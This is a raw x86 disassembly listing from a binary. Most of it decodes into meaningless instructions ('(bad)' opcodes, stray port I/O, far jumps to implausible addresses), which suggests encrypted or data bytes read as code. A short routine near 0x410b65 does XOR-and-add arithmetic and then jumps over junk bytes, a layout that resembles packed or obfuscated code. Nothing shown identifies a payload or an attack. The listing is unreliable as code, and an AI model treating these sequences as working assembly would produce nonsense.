  41081b:	push   ecx
  41081c:	lods   al,BYTE PTR ds:[esi]
  41081d:	popa   
  41081e:	sbb    BYTE PTR [edx],al
  410820:	out    dx,eax
  410821:	xchg   esi,eax
  410822:	loop   0x410897
  410824:	in     eax,0xcf
  410826:	mov    ah,0x75
  410828:	and    ah,BYTE PTR [edx]
  41082a:	mov    eax,ds:0x832543ae
  41082f:	fild   WORD PTR [edx]
  410831:	jmp    0x849053d0
  410836:	sahf   
  410837:	and    BYTE PTR [ebp+0x19],0x92
  41083b:	fisttp DWORD PTR [esi]
  41083d:	data16 mov ch,0x49
  410840:	push   ecx
  410841:	push   ss
  410842:	push   edx
  410843:	dec    ecx
  410844:	inc    ebp
  410845:	call   0xb8d54510
  41084a:	cmp    cl,al
  41084c:	cli    
  41084d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41084e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41084f:	push   esi
  410850:	xchg   ebx,eax
  410851:	jl     0x410897
  410853:	(bad)  
  410854:	xor    al,0xa9
  410856:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410857:	ret    0x68d9
  41085a:	push   0xffffffa5
  41085c:	in     al,dx
  41085d:	ret    0x721d
  410860:	into   
  410861:	add    ah,BYTE PTR [edi+0x51f9e3cd]
  410867:	mov    dh,ah
  410869:	or     al,0x4a
  41086b:	test   DWORD PTR [edx+0x31],eax
  41086e:	sbb    al,0x33
  410870:	jns    0x41081f
  410872:	mov    dh,0xe2
  410874:	bound  esp,QWORD PTR [ecx+0x4455da06]
  41087a:	(bad)  
  41087b:	pop    edx
  41087c:	sti    
  41087d:	cmp    ah,cl
  41087f:	adc    eax,0x3b306b57
  410884:	inc    edi
  410885:	stos   DWORD PTR es:[edi],eax
  410886:	aas    
  410887:	sub    DWORD PTR [esi-0x20],eax
  41088a:	adc    ah,BYTE PTR [esi]
  41088c:	loope  0x4108dd
  41088e:	ret    0x5737
  410891:	sbb    al,0x99
  410893:	rcl    ah,0x95
  410896:	test   al,0x47
  410898:	push   ebx
  410899:	xchg   DWORD PTR [edx+0x6fa2b250],edx
  41089f:	rol    edi,1
  4108a1:	ret    0x713d
  4108a4:	push   ss
  4108a5:	xchg   esi,eax
  4108a6:	mov    ch,bl
  4108a8:	push   ds
  4108a9:	arpl   WORD PTR [ecx-0x74],di
  4108ac:	ret    0xa7a2
  4108af:	test   ch,dl
  4108b1:	mov    bl,BYTE PTR [edi+0x635f99a5]
  4108b7:	es sub al,0xd8
  4108ba:	xchg   DWORD PTR [edi],ebp
  4108bc:	mov    bh,0x33
  4108be:	adc    BYTE PTR [ebx],dh
  4108c0:	inc    ebp
  4108c1:	in     eax,dx
  4108c2:	adc    al,0x42
  4108c4:	lds    ebx,FWORD PTR [edx+0x4f5c9661]
  4108ca:	syscall 
  4108cc:	dec    edi
  4108cd:	cmc    
  4108ce:	pop    ecx
  4108cf:	repz dec ebx
  4108d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108d2:	sbb    eax,0xefd45d96
  4108d7:	dec    ebx
  4108d8:	push   ds
  4108d9:	inc    esi
  4108da:	adc    al,0x66
  4108dc:	cwde   
  4108dd:	ds sub edi,eax
  4108e0:	mov    al,0xe5
  4108e2:	pop    ebx
  4108e3:	fistp  WORD PTR [eax-0x40]
  4108e6:	aaa    
  4108e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108e8:	std    
  4108e9:	(bad)  
  4108eb:	(bad)  
  4108ec:	add    edi,DWORD PTR [ebx+0x3e8ea6fd]
  4108f2:	mov    esp,DWORD PTR [edi]
  4108f4:	lds    esi,FWORD PTR [ecx+0x9]
  4108f7:	adc    ebx,ebx
  4108f9:	sahf   
  4108fa:	push   ebp
  4108fb:	cli    
  4108fc:	retf   0xdb19
  4108ff:	push   esi
  410900:	es xchg esp,eax
  410902:	add    al,BYTE PTR ds:0xec9b73d0
  410908:	pusha  
  410909:	adc    BYTE PTR [ecx+0x15],ah
  41090c:	jle    0x41097b
  41090e:	pop    ebp
  41090f:	nop
  410910:	pop    esp
  410911:	retf   0xd62a
  410914:	mov    edi,0x540b9869
  410919:	mov    DWORD PTR [ebx+0x33],ecx
  41091c:	xchg   ebp,eax
  41091d:	jne    0x410946
  41091f:	mov    eax,0xd18e324b
  410924:	retf   0xb8c7
  410927:	ficomp DWORD PTR [eax-0x45]
  41092a:	inc    edi
  41092b:	mov    DWORD PTR [edx],edx
  41092d:	add    edx,DWORD PTR [edx]
  41092f:	in     eax,0x53
  410931:	dec    esi
  410932:	outs   dx,DWORD PTR ds:[esi]
  410933:	sbb    eax,0xcae23518
  410938:	ret    
  410939:	inc    ecx
  41093a:	gs pop esi
  41093c:	add    edx,ebp
  41093e:	psubq  mm4,QWORD PTR [eax+0x27]
  410942:	or     al,0xc9
  410944:	retf   0xfb4b
  410947:	bound  edx,QWORD PTR [esp+esi*8]
  41094a:	and    bh,BYTE PTR [ebp-0x75]
  41094d:	leave  
  41094e:	out    0x25,al
  410950:	leave  
  410951:	sub    BYTE PTR [ebx],bh
  410953:	sbb    al,0x4b
  410955:	mov    ch,0x26
  410957:	adc    esi,DWORD PTR [ecx+0x3bc1d291]
  41095d:	out    dx,eax
  41095e:	mov    bl,0x1b
  410960:	(bad)  
  410961:	mov    bh,0x65
  410963:	and    al,0x40
  410965:	data16 mov bl,0x98
  410968:	mov    ah,0x22
  41096a:	out    0x87,eax
  41096c:	mov    ah,BYTE PTR [ebp-0x5cc19289]
  410972:	mov    esp,0x8044c67b
  410977:	xchg   ecx,esi
  410979:	mov    bh,0xb0
  41097b:	or     esi,DWORD PTR [esp+ecx*1-0x2c]
  41097f:	fiadd  DWORD PTR [eax-0x37ee7e6c]
  410985:	xchg   edx,eax
  410986:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410987:	dec    ecx
  410988:	or     BYTE PTR ds:0xd7c9fc2e,bl
  41098e:	into   
  41098f:	push   esi
  410990:	retf   0xc1c2
  410993:	mov    ch,0x46
  410995:	fcomp  DWORD PTR [ebp+0x51f2d860]
  41099b:	cmp    DWORD PTR [eax-0x2e],eax
  41099e:	or     WORD PTR [edi],di
  4109a1:	jecxz  0x4109f5
  4109a3:	cld    
  4109a4:	or     BYTE PTR [ecx+ecx*4],0x6d
  4109a8:	sar    cl,cl
  4109aa:	add    eax,0x2079bf8b
  4109af:	xchg   ebx,eax
  4109b0:	data16 jecxz 0x410943
  4109b3:	in     al,0x7f
  4109b5:	mov    dl,0x9
  4109b7:	adc    DWORD PTR [ebp-0x492b2ec3],esi
  4109bd:	fs sahf 
  4109bf:	push   ebx
  4109c0:	ret    0x3f2c
  4109c3:	dec    ebp
  4109c4:	or     DWORD PTR [edi],0x4a680398
  4109ca:	fwait
  4109cb:	dec    edx
  4109cc:	adc    eax,0x1a5b3fb8
  4109d1:	out    dx,eax
  4109d2:	mov    ecx,0x84a805ea
  4109d7:	adc    al,0xc8
  4109d9:	shl    DWORD PTR [eax-0x3e361774],0xeb
  4109e0:	lahf   
  4109e1:	out    dx,eax
  4109e2:	pushf  
  4109e3:	daa    
  4109e4:	scas   al,BYTE PTR es:[edi]
  4109e5:	dec    edx
  4109e6:	mov    edi,ebx
  4109e8:	or     bh,BYTE PTR [ecx]
  4109ea:	xchg   edi,eax
  4109eb:	dec    esi
  4109ec:	mov    WORD PTR [edi-0x15],ds
  4109ef:	mov    esp,0x7065c362
  4109f4:	mov    eax,0xad98d82c
  4109f9:	rcl    DWORD PTR [ecx-0x6329eaae],0x69
  410a00:	icebp  
  410a01:	mov    dl,0xb4
  410a03:	retf   
  410a04:	and    BYTE PTR [eax],bl
  410a06:	pop    ds
  410a07:	dec    esi
  410a08:	xchg   ebp,eax
  410a09:	int3   
  410a0a:	lea    ebx,[eax-0x213d3434]
  410a10:	fadd   DWORD PTR [ebx]
  410a12:	enter  0x7e3c,0xb7
  410a16:	push   edx
  410a17:	or     BYTE PTR [eax-0x466cfdf5],dl
  410a1d:	mov    ah,0xa2
  410a1f:	dec    esi
  410a20:	jo     0x410a9a
  410a22:	fs dec esi
  410a24:	sti    
  410a25:	stos   DWORD PTR es:[edi],eax
  410a26:	cmp    BYTE PTR [ecx-0x26],dh
  410a29:	in     eax,dx
  410a2a:	mov    DWORD PTR [edx+0x17],ebx
  410a2d:	sub    dl,BYTE PTR [edx+0x39bd7244]
  410a33:	cld    
  410a34:	pop    ss
  410a35:	test   DWORD PTR [ecx],edi
  410a37:	xchg   edx,eax
  410a38:	stc    
  410a39:	pop    ds
  410a3a:	int    0xfc
  410a3c:	cmp    ah,BYTE PTR [edi+0x2b0c70f7]
  410a42:	outs   dx,BYTE PTR fs:[esi]
  410a44:	push   ds
  410a45:	push   edi
  410a46:	test   DWORD PTR [esi],esp
  410a48:	aad    0x4b
  410a4a:	and    dh,0xbe
  410a4d:	or     ebx,DWORD PTR [ebx]
  410a4f:	sub    al,0x42
  410a51:	in     eax,0xba
  410a53:	fidiv  DWORD PTR [eax+eax*4-0x4a]
  410a57:	ret    
  410a58:	pop    ebp
  410a59:	jl     0x410a6b
  410a5b:	jmp    0xbed3:0x7dddcd5d
  410a62:	out    dx,al
  410a63:	xchg   esp,eax
  410a64:	xor    ecx,esi
  410a66:	xchg   ecx,eax
  410a67:	daa    
  410a68:	mov    esp,DWORD PTR [ebx+0x50072106]
  410a6e:	retf   0xf451
  410a71:	loope  0x410a41
  410a73:	mov    DWORD PTR [edx-0x6ce7e957],ecx
  410a79:	ins    BYTE PTR es:[edi],dx
  410a7a:	adc    ah,BYTE PTR [esp+ebx*1]
  410a7d:	adc    esi,ebp
  410a7f:	or     BYTE PTR [ecx+0x27],0xe3
  410a83:	inc    ecx
  410a84:	mov    BYTE PTR ds:0x88736e2a,al
  410a8a:	leave  
  410a8b:	mov    ch,0x8c
  410a8d:	adc    edx,DWORD PTR [ebp+0x4d]
  410a90:	pushf  
  410a91:	outs   dx,DWORD PTR ds:[esi]
  410a92:	outs   dx,DWORD PTR ds:[esi]
  410a93:	pop    edi
  410a94:	cld    
  410a95:	test   BYTE PTR [ebx+0x7f],ah
  410a98:	jge    0x410b0a
  410a9a:	icebp  
  410a9b:	mov    ds:0xcd0f78c0,al
  410aa0:	aas    
  410aa1:	(bad)  
  410aa2:	sub    bl,al
  410aa4:	gs mov al,0x74
  410aa7:	(bad)  [edx+0x49]
  410aaa:	leave  
  410aab:	sbb    eax,0x41d25a71
  410ab0:	push   0x7e
  410ab2:	pop    esi
  410ab3:	fld    st(0)
  410ab5:	and    al,0x1a
  410ab7:	pop    edi
  410ab8:	lds    edx,FWORD PTR [edx-0x1ca8e5b0]
  410abe:	push   ss
  410abf:	das    
  410ac0:	xchg   ebx,ecx
  410ac2:	iret   
  410ac3:	or     al,0x15
  410ac5:	dec    ebx
  410ac6:	adc    bh,ah
  410ac8:	divps  xmm6,XMMWORD PTR [eax+0x7ae484ab]
  410acf:	pop    eax
  410ad0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ad1:	mov    ds:0xc6b8404,al
  410ad6:	ins    DWORD PTR es:[edi],dx
  410ad7:	fsub   DWORD PTR [ebx+0x30]
  410ada:	and    DWORD PTR ds:0xbceb66be,edx
  410ae0:	jae    0x410a97
  410ae2:	cld    
  410ae3:	(bad)  
  410ae4:	mov    ch,0x6e
  410ae6:	call   0x2a924eb5
  410aeb:	stc    
  410aec:	sahf   
  410aed:	scas   al,BYTE PTR es:[edi]
  410aee:	sti    
  410aef:	jle    0x410ad3
  410af1:	mov    cl,BYTE PTR [ebx+0x22]
  410af4:	sbb    esi,DWORD PTR [ebx]
  410af6:	fdiv   DWORD PTR [ebp+0x6e]
  410af9:	push   cs
  410afa:	lds    esi,FWORD PTR [edx-0x4fe462f7]
  410b00:	bound  esp,QWORD PTR [esi]
  410b02:	cmp    cl,dh
  410b04:	adc    ah,ah
  410b06:	into   
  410b07:	add    eax,0x66576a40
  410b0c:	and    ch,BYTE PTR [ecx-0x424def23]
  410b12:	dec    esi
  410b13:	sahf   
  410b14:	lahf   
  410b15:	aam    0x2d
  410b17:	inc    esp
  410b18:	inc    edx
  410b19:	sbb    al,0x57
  410b1b:	pop    eax
  410b1c:	pop    edx
  410b1d:	mov    ch,0xde
  410b1f:	aad    0x91
  410b21:	enter  0x7b18,0x3a
  410b25:	lds    edx,FWORD PTR [ebx]
  410b27:	push   ds
  410b28:	push   ebp
  410b29:	enter  0xbb0e,0xaf
  410b2d:	fidivr DWORD PTR [ebx]
  410b2f:	xor    ch,bh
  410b31:	pop    esp
  410b32:	add    BYTE PTR [esi],bh
  410b34:	mov    bh,0x18
  410b36:	push   ebp
  410b37:	in     eax,dx
  410b38:	add    eax,0xf749ad86
  410b3d:	les    eax,FWORD PTR ds:0xbc857eeb
  410b43:	clc    
  410b44:	fsub   DWORD PTR [edx+0x457beadd]
  410b4a:	xchg   edi,eax
  410b4b:	test   al,0x35
  410b4d:	mov    esi,ebx
  410b4f:	xchg   edx,eax
  410b50:	loop   0x410bb2
  410b52:	loope  0x410af9
  410b54:	push   esp
  410b55:	inc    edi
  410b56:	dec    esp
  410b57:	or     edi,DWORD PTR [eax-0x59958f8]
  410b5d:	sub    cl,dh
  410b5f:	rol    edx,1
  410b61:	cmp    DWORD PTR [esi+0x54],eax
  410b64:	pop    esi
  410b65:	je     0x410b73
  410b6b:	mov    eax,DWORD PTR [ebp+0x8]
  410b6e:	jmp    0x410b8c
  410b73:	mov    eax,DWORD PTR [ebp-0x4]
  410b76:	xor    eax,edx
  410b78:	add    eax,ecx
  410b7a:	jmp    0x410b8c
  410b7f:	mov    eax,DWORD PTR [ebp-0x4]
  410b82:	xor    eax,0x7510855
  410b87:	add    eax,0x32729c
  410b8c:	leave  
  410b8d:	ret    0x4
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	jmp    0x410f98
  410b98:	outs   dx,DWORD PTR ds:[esi]
  410b99:	mov    WORD PTR ds:0x7191e994,cs
  410b9f:	jae    0x410bc2
  410ba1:	dec    esi
  410ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba3:	repz ret 
  410ba5:	and    al,0x4
  410ba7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba8:	ds inc edx
  410baa:	jo     0x410c1c
  410bac:	pop    eax
  410bad:	jge    0x410c1f
  410baf:	jo     0x410bf6
  410bb1:	ret    0xca53
  410bb4:	adc    BYTE PTR gs:[edx],0x6
  410bb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bb9:	loop   0x410b96
  410bbb:	sbb    BYTE PTR [ebx+0x6d0f5095],0xb
  410bc2:	add    al,0xe5
  410bc4:	scas   al,BYTE PTR es:[edi]
  410bc5:	mov    ebp,0x28d85a9f
  410bca:	int    0x18
  410bcc:	ret    
  410bcd:	sub    BYTE PTR ss:[edx-0x688aabb3],0xea
  410bd5:	dec    eax
  410bd6:	inc    eax
  410bd7:	rol    ecx,1
  410bd9:	idiv   DWORD PTR [esi]
  410bdb:	inc    esi
  410bdc:	xlat   BYTE PTR ds:[ebx]
  410bdd:	or     al,0x10
  410bdf:	(bad)  
  410be0:	fbld   TBYTE PTR [esi+esi*2-0x5e0178f3]
  410be7:	lock in eax,0x2d
  410bea:	fcomp  QWORD PTR [eax+0x7b42f553]
  410bf0:	mov    al,ds:0x1a264038
  410bf5:	add    al,0x22
  410bf7:	xchg   ebp,eax
  410bf8:	sbb    eax,0xa8caeb2f
  410bfd:	fadd   DWORD PTR [edi-0x44]
  410c00:	push   0x25
  410c02:	inc    esi
  410c03:	sbb    al,0x6f
  410c05:	pop    esi
  410c06:	std    
  410c07:	test   eax,0x178cb4bd
  410c0c:	fwait
  410c0d:	ss pop eax
  410c0f:	clc    
  410c10:	push   0xffffff88
  410c12:	retf   0xc60f
  410c15:	push   es
  410c16:	ficomp DWORD PTR [ebp-0x80]
  410c19:	sbb    DWORD PTR [edi+0x7],eax
  410c1c:	push   edx
  410c1d:	inc    ebp
  410c1e:	xor    BYTE PTR [edi-0x5170bcd],dl
  410c24:	sub    DWORD PTR [edi+0x32],esi
  410c27:	jne    0x410c31
  410c29:	mov    ds:0xaca28e37,eax
  410c2e:	add    al,0x3b
  410c30:	mov    ah,BYTE PTR [ebx+0x1f]
  410c33:	into   
  410c34:	push   ebp
  410c35:	inc    esp
  410c36:	lock sbb eax,0x2195763a
  410c3c:	adc    dl,BYTE PTR [eax+0x14]
  410c3f:	call   0x96918efc
  410c44:	ins    BYTE PTR es:[edi],dx
  410c45:	mov    al,0xf9
  410c47:	xchg   ebp,eax
  410c48:	jmp    0x410c9e
  410c4a:	retf   
  410c4b:	inc    esp
  410c4c:	cmp    al,0xff
  410c4e:	je     0x410be1
  410c50:	cwde   
  410c51:	pop    ss
  410c52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c53:	popf   
  410c54:	push   esi
  410c55:	xlat   BYTE PTR ds:[ebx]
  410c56:	fwait
  410c57:	rol    cl,1
  410c59:	sar    DWORD PTR [ebx+0x69],1
  410c5c:	xchg   esi,eax
  410c5e:	push   ebp
  410c5f:	std    
  410c60:	pop    DWORD PTR ds:0x11d63616
  410c66:	push   esi
  410c67:	daa    
  410c68:	xchg   edx,eax
  410c69:	imul   ecx,esp,0xb7fc08cf
  410c6f:	outs   dx,DWORD PTR ds:[esi]
  410c70:	mov    ds:0x9ac9c525,al
  410c75:	fisubr DWORD PTR [eax]
  410c77:	(bad)  
  410c78:	jnp    0x410cf1
  410c7a:	in     eax,dx
  410c7b:	sbb    BYTE PTR [esi+0x10c5e5c1],dl
  410c81:	jmp    DWORD PTR [edx+esi*8-0x5c796bb1]
  410c88:	sar    BYTE PTR [ebp-0x78],cl
  410c8b:	add    DWORD PTR [ebx+eiz*1+0x7de36462],0xa72cf3cb
  410c96:	stos   DWORD PTR es:[edi],eax
  410c97:	mov    eax,0x9cf4dcba
  410c9c:	adc    esp,eax
  410c9e:	push   ebp
  410c9f:	mov    edx,DWORD PTR [bx+si]
  410ca2:	(bad)  
  410ca4:	dec    bl
  410ca6:	pop    esi
  410ca7:	mov    ah,0x5e
  410ca9:	das    
  410caa:	push   ebx
  410cab:	sti    
  410cac:	imul   esp,esp,0x14
  410caf:	mov    bl,0xb0
  410cb1:	fs mov ebp,0xf36dc46d
  410cb7:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cb9:	jb     0x410c78
  410cbb:	fucomip st,st(0)
  410cbd:	into   
  410cbe:	jl     0x410ccd
  410cc0:	add    eax,0x47c27669
  410cc5:	mov    ebp,0x9fd3ac4c
  410cca:	push   ecx
  410ccb:	adc    al,bh
  410ccd:	xor    BYTE PTR [esi+ebx*4+0x6e62fa5b],bl
  410cd4:	cdq    
  410cd5:	push   ebp
  410cd6:	outs   dx,BYTE PTR ds:[esi]
  410cd7:	nop
  410cd8:	je     0x410cf4
  410cda:	into   
  410cdb:	out    0x9d,al
  410cdd:	ror    BYTE PTR [edx+0x75db836e],0xa
  410ce4:	pushf  
  410ce5:	jmp    0x1f4b8369
  410cea:	add    DWORD PTR [edx],ebp
  410cec:	add    eax,0x71936f58
  410cf1:	jl     0x410ce1
  410cf3:	mov    ah,0x3b
  410cf5:	(bad)  
  410cf7:	push   ds
  410cf8:	leave  
  410cf9:	adc    esi,ecx
  410cfb:	je     0x410cba
  410cfd:	dec    edi
  410cfe:	(bad)  
  410cff:	cmp    ch,BYTE PTR [eax+0x13]
  410d02:	add    al,0xff
  410d04:	retf   
  410d05:	xor    BYTE PTR [ecx],dh
  410d07:	mov    WORD PTR [ecx],es
  410d09:	retf   
  410d0a:	fsubr  st(6),st
  410d0c:	jge    0x410d06
  410d0e:	aas    
  410d0f:	loop   0x410d70
  410d11:	mov    ebx,0xfd0a681b
  410d16:	int3   
  410d17:	xor    BYTE PTR [edx-0x5bece93],cl
  410d1d:	pusha  
  410d1e:	mov    DWORD PTR [ebp-0x29],edx
  410d21:	lock adc edi,ecx
  410d24:	das    
  410d25:	ss jmp 0xc4d6eb12
  410d2b:	sub    esp,DWORD PTR [ecx+eax*1-0x9]
  410d2f:	sbb    edx,ecx
  410d31:	or     al,0x0
  410d33:	clc    
  410d34:	mov    esp,esi
  410d36:	imul   cl
  410d38:	into   
  410d39:	pop    ds
  410d3a:	sar    BYTE PTR [edi],0x38
  410d3d:	jl     0x410ceb
  410d3f:	sar    ch,0xbd
  410d42:	adc    eax,0xd3a049dc
  410d47:	aas    
  410d48:	adc    al,0x52
  410d4a:	mov    ds:0xa05dfbc,al
  410d4f:	jb     0x410d8d
  410d51:	call   0xadcbe25d
  410d56:	dec    ebx
  410d57:	rcl    esi,cl
  410d59:	mov    ch,bh
  410d5b:	dec    esp
  410d5c:	test   DWORD PTR [ecx+0x33],edi
  410d5f:	push   ss
  410d60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d61:	out    0x7c,eax
  410d63:	pop    ebx
  410d64:	pop    esi
  410d65:	cli    
  410d66:	es shl ebp,cl
  410d69:	pop    ebx
  410d6a:	call   0xf353:0x48459df3
  410d71:	xlat   BYTE PTR ds:[ebx]
  410d72:	add    eax,0xabe79556
  410d77:	ja     0x410d32
  410d79:	mov    cl,0x1a
  410d7b:	sahf   
  410d7c:	in     al,0x25
  410d7e:	mov    al,0x2b
  410d80:	jae    0x410d0d
  410d82:	push   es
  410d83:	mov    es,WORD PTR [edi-0x5a]
  410d86:	std    
  410d87:	(bad)  
  410d88:	sub    eax,0xa72d74a4
  410d8d:	mov    bh,0x70
  410d8f:	in     eax,dx
  410d90:	loope  0x410e0a
  410d92:	mov    gs,WORD PTR ss:0x649caa96
  410d99:	or     ecx,esi
  410d9b:	cld    
  410d9c:	sti    
  410d9d:	mov    WORD PTR [edx],ss
  410d9f:	or     eax,0x518e6774
  410da4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410da5:	sbb    DWORD PTR [edx],ecx
  410da7:	les    esp,FWORD PTR [ecx-0xf]
  410daa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410dab:	inc    edi
  410dac:	mov    ebp,0xbe7f8c94
  410db1:	push   ss
  410db2:	ds dec esi
  410db4:	xor    al,0xcd
  410db6:	xchg   ecx,eax
  410db7:	cmp    ebx,edx
  410db9:	xor    bl,BYTE PTR [eax+0x3148795c]
  410dbf:	mov    edi,DWORD PTR [eax-0x4f893720]
  410dc5:	and    dl,BYTE PTR [edx]
  410dc7:	aaa    
  410dc8:	or     al,0x95
  410dca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410dcb:	std    
  410dcc:	sub    al,0x2f
  410dce:	pop    eax
  410dcf:	push   eax
  410dd0:	mov    edx,0x40a22869
  410dd5:	adc    ch,BYTE PTR [ebx-0x1472b864]
  410ddb:	inc    ebp
  410ddc:	sbb    dl,ah
  410dde:	sub    cl,BYTE PTR [eax+ebp*1+0x76dd7f19]
  410de5:	or     BYTE PTR [ebp+0x54],ch
  410de8:	push   ecx
  410de9:	stos   BYTE PTR es:[edi],al
  410dea:	in     eax,0xc9
  410dec:	jb     0x410e19
  410dee:	sub    al,0x25
  410df0:	and    ah,BYTE PTR [esi-0x50fb38fd]
  410df6:	sahf   
  410df7:	je     0x410dbc
  410df9:	test   ebx,ecx
  410dfb:	popf   
  410dfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410dfd:	xchg   esi,eax
  410dfe:	cmc    
  410dff:	nop
  410e00:	(bad)  
  410e02:	imul   edi,esp,0xedb6474
  410e08:	jbe    0x410e08
  410e0a:	cmp    dl,al
  410e0c:	pop    edi
  410e0d:	and    eax,0xdca8264a
  410e12:	aam    0x9b
  410e14:	push   ecx
  410e15:	test   BYTE PTR [edi+0x78],cl
  410e18:	cmp    al,0xb9
  410e1a:	retf   0x75aa
  410e1d:	pop    esp
  410e1e:	mov    eax,ds:0x56d86559
  410e23:	scas   al,BYTE PTR es:[edi]
  410e24:	gs push esi
  410e26:	push   ebp
  410e27:	xor    cl,BYTE PTR [ebx-0x78]
  410e2a:	(bad)  
  410e2b:	sar    BYTE PTR [eax+esi*8+0x741a425a],1
  410e32:	int    0x2b
  410e34:	test   eax,0x8da9ada3
  410e39:	sub    esp,DWORD PTR [edx+0x77]
  410e3c:	or     eax,0x97e4f0ef
  410e41:	sub    eax,0xf0a2a93b
  410e46:	hlt    
  410e47:	mov    DWORD PTR [esi-0x18fcc86],ebp
  410e4d:	div    DWORD PTR [edi]
  410e4f:	mov    ebx,0x1f894472
  410e54:	sub    eax,DWORD PTR [ebx]
  410e56:	sbb    dh,bl
  410e58:	sub    al,0xd5
  410e5a:	jns    0x410e9a
  410e5c:	aad    0x2
  410e5e:	mov    al,0x42
  410e60:	mov    al,BYTE PTR gs:[ecx+eiz*2-0x62]
  410e65:	shl    dl,cl
  410e67:	out    0xfc,al
  410e69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e6a:	sub    DWORD PTR [esi+0x5c55a1c9],edi
  410e70:	cmp    DWORD PTR [eax+0x76e33ceb],ebx
  410e76:	pop    ecx
  410e77:	mov    ebx,0x132e4851
  410e7c:	(bad)  
  410e7d:	jg     0x410e49
  410e7f:	and    eax,0xb4630f6f
  410e84:	add    al,0x40
  410e86:	dec    esi
  410e87:	or     dh,BYTE PTR [ebx+0x6be23b84]
  410e8d:	xchg   edi,eax
  410e8e:	dec    edi
  410e8f:	in     al,dx
  410e90:	adc    bl,BYTE PTR [edi+ecx*1]
  410e93:	sbb    edx,ecx
  410e95:	bound  eax,QWORD PTR [ecx+edx*2+0x23d44140]
  410e9c:	xor    edi,DWORD PTR [ecx-0x1a]
  410e9f:	nop
  410ea0:	lea    ecx,[ebp+ebp*2-0x1a04f3d4]
  410ea7:	ficom  WORD PTR [eax+0x14]
  410eaa:	in     eax,0x42
  410eac:	pop    ecx
  410ead:	fadd   DWORD PTR [ebx+0x9]
  410eb0:	pop    edi
  410eb1:	scas   eax,DWORD PTR es:[edi]
  410eb2:	div    DWORD PTR [ebp-0xf]
  410eb5:	or     BYTE PTR [esi+eiz*4],ch
  410eb8:	(bad)
  410ebd:	repnz in al,dx
  410ebf:	int    0xd8
  410ec1:	rcl    BYTE PTR [ebx-0x2c],0xfb
  410ec5:	sti    
  410ec6:	fiadd  DWORD PTR [esp+eiz*2-0x44e236f3]
  410ecd:	int3   
  410ece:	inc    esi
  410ecf:	xor    al,0x5d
  410ed1:	xchg   DWORD PTR [edx+0x379836],ecx
  410ed7:	(bad)
  410eda:	sbb    edi,edi
  410edc:	xchg   BYTE PTR [eax+0x3a],bl
  410edf:	int    0x8a
  410ee1:	push   ss
  410ee2:	xchg   esp,eax
  410ee3:	mov    dh,0xe3
  410ee5:	ret    0x4020
  410ee8:	push   es
  410ee9:	xlat   BYTE PTR ds:[ebx]
  410eea:	pop    esi
  410eeb:	dec    edi
  410eec:	mov    edx,0xf46e4d78
  410ef1:	repz or BYTE PTR [ecx-0x49c83b45],ah
  410ef8:	fucomi st,st(5)
  410efa:	dec    eax
  410efb:	xchg   ebp,eax
  410efc:	sbb    eax,0xfa5e686b
  410f01:	in     al,dx
  410f02:	je     0x410f17
  410f04:	jecxz  0x410ef7
  410f06:	push   ebx
  410f07:	popa   
  410f08:	dec    edi
  410f09:	or     al,0x68
  410f0b:	xor    BYTE PTR [ebx-0x54],cl
  410f0e:	data16 int3 
  410f10:	std    
  410f11:	popf   
  410f12:	test   dh,cl
  410f14:	or     al,0xff
  410f16:	push   cs
  410f17:	jmp    0xd73b:0x1301bf5
  410f1e:	cli    
  410f1f:	loop   0x410f70
  410f21:	arpl   WORD PTR [ecx-0x8a8311d],cx
  410f27:	dec    BYTE PTR [esi+0xb]
  410f2a:	dec    ebp
  410f2b:	push   0xffffffe7
  410f2d:	or     DWORD PTR [ecx],esi
  410f2f:	fld    DWORD PTR [ecx-0x2d]
  410f32:	sub    al,0x98
  410f34:	mov    WORD PTR ds:0x2bdbf43a,fs
  410f3a:	xor    cl,0x67
  410f3d:	retf   
  410f3e:	push   ebp
  410f3f:	ja     0x410f42
  410f41:	ss jbe 0x410f9f
  410f44:	mov    dh,0x65
  410f46:	adc    eax,0x428981a8
  410f4b:	xchg   ebx,eax
  410f4c:	out    dx,eax
  410f4d:	aas    
  410f4e:	sbb    BYTE PTR [ebx+0x4b],0xba
  410f52:	fwait
  410f53:	test   DWORD PTR [edx],eax
  410f55:	shl    ah,cl
  410f57:	pop    ecx
  410f58:	ror    BYTE PTR [eax],cl
  410f5a:	dec    edx
  410f5b:	jo     0x410fa6
  410f5d:	cmc    
  410f5e:	stos   BYTE PTR es:[edi],al
  410f5f:	push   edi
  410f60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f61:	sbb    al,0x83
  410f63:	mov    edi,0x878df2af
  410f68:	cmp    cl,BYTE PTR [ebp+0x45]
  410f6b:	out    dx,eax
  410f6c:	pop    ss
  410f6d:	adc    eax,ebx
  410f6f:	cmp    edx,DWORD PTR ds:0xf5f8ddef
  410f75:	push   esp
  410f76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f77:	rcl    BYTE PTR [eax],0xc4
  410f7a:	mov    esi,0xc5198b8c
  410f7f:	cmp    DWORD PTR [esi-0x70],ebp
  410f82:	cmp    edi,DWORD PTR [edi+0x5e]
  410f85:	in     eax,dx
  410f86:	mov    eax,0xa7ed5ae2
  410f8b:	mul    DWORD PTR [esi]
  410f8d:	(bad)  
  410f8e:	cmp    DWORD PTR [esi],ebp
  410f90:	xchg   esp,eax
  410f91:	dec    eax
  410f92:	aad    0xce
  410f94:	lahf   
  410f95:	pop    esi
